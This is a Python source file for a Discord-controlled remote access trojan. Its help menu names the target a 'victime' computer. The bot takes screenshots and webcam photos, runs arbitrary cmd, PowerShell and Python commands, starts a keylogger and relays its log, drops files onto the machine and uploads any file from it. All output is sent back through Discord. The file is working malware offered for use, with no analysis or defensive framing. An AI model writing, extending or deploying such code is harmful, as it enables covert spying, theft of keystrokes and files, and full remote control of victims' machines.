import pyautogui
import cv2
import os
import discord


def screenshot():
    screen = pyautogui.screenshot()
    screen.save('test.png')

def cam():
    cam = cv2.VideoCapture(0)
    s, img = cam.read()
    if s:
        cv2.imwrite("test.png",img)

def cmd(command):
    os.system(command[5:] + '> test.txt')

def powershell(command):
    os.system("""powershell -Command "& {""" + command[7:] + """}" > test.txt""")

def http(url):
    os.system('start "" ' + url[6:])

def python(command):
    command = command[8:].split(' | ')
    file = open('test.py', 'w')
    for i in command:
        file.write(i + '\n')
    file.close()
    os.system('python test.py > test.txt')
    os.remove('test.py')


client = discord.Client(intents=discord.Intents.all())



@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('------')


@client.event
async def on_message(message):
    if message.author.id == client.user.id:
        return

    #afficher les commandes
    elif message.content == '!help':
        await message.channel.send("""**!screen** -> take screen\n**!cam** -> take camera picture\n**!cmd** *<command>* -> execute command in cmd\n**!power** *<command>* -> execute command in powershell (need administrator privilage)\n**!keylog** -> start keylogger\n**!sendkl** -> send result of keylogger\n**!download** *<file>* -> download file in victime computeur\n**!upload** *<path>* -> recovered the file\n**!http** *<url>* -> open web page\n**!python** *<command-1> | <command-2> | ...* -> run python commands""", reference=message)
    
    elif message.content.startswith('!hello'):
        await message.channel.send('Hello {0.author.mention}'.format(message), reference=message)
    
    elif message.content == '!screen':
        screenshot()
        await message.channel.send(file=discord.File(r'test.png'), reference=message)
        os.remove('test.png')
    
    elif message.content == '!cam':
        try:
            cam()
            await message.channel.send(file=discord.File(r'test.png'), reference=message)
            os.remove('test.png')
        except:
            await message.channel.send('No cam', reference=message)
    
    elif message.content.startswith('!cmd'):
        try:
            cmd(message.content)
            a = open('test.txt', 'r')
            await message.channel.send(a.read(), reference=message)
            a.close()
            os.remove('test.txt')
        except FileNotFoundError:
            await message.channel.send('Nothing return', reference=message)
        except discord.errors.HTTPException:await message.channel.send('Bad request', reference=message)
    
    elif message.content.startswith('!power'):
        try:
            powershell(message.content)
            a = open('test.txt', 'r')
            await message.channel.send(a.read(), reference=message)
            a.close()
            os.remove('test.txt')
        except FileNotFoundError:
            await message.channel.send('Nothing return', reference=message)
    
    elif message.content == '!keylog':
        try:
            os.system('start keylogger.pyw')
            await message.channel.send('Keylogger start', reference=message)
        except:
            await message.channel.send("You don't have download keylogger", reference=message)
    
    elif message.content == '!sendkl':
        try:
            a = open('temp.txt', 'r')
            await message.channel.send(a.read(), reference=message)
            a.close()
            open("temp.txt", 'w').write('')
        except:
            await message.channel.send('Keylogger not started', reference=message)
    
    elif message.content.startswith('!download'):
        if str(message.attachments) == "[]": 
            await message.channel.send('There is no file attached to the message', reference=message)
        else:
            split_v1 = str(message.attachments).split("filename='")[1]
            filename = str(split_v1).split("' ")[0]
            await message.attachments[0].save(fp="{}".format(filename))
            await message.channel.send('File download', reference=message)
    
    elif message.content.startswith('!upload'):
        if os.path.isfile(message.content[8:]):
            await message.channel.send(message.content[8:], file=discord.File(message.content[8:]), reference=message)
        else:
            await message.channel.send("File don't exist", reference=message)
    
    elif message.content.startswith('!http'):
        http(message.content)
        await message.channel.send("It's ok", reference=message)
    
    elif message.content.startswith('!python'):
        python(message.content)
        a = open('test.txt', 'r')
        await message.channel.send(a.read(), reference=message)
        a.close()
        os.remove('test.txt')



client.run("BOT TOKEN")

